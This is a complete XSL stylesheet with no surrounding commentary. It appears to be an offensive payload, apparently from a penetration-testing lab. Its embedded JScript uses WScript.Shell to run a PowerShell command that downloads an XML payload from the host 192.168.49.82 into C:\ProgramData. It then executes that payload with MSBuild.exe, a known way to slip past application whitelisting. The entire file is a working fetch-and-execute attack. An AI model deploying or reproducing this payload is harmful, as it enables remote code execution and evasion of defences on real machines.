<?xml version='1.0'?> 
 <stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"  xmlns:user="unknown" version="1.0">
<output method="text"/>
<ms:script language="JScript" implements-prefix="user"> 
 <![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c powershell wget 192.168.49.82/Verified/new/payload.xml -O C:\\ProgramData\\payload.xml;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\ProgramData\\payload.xml");
]]> 
 </ms:script>
</stylesheet>
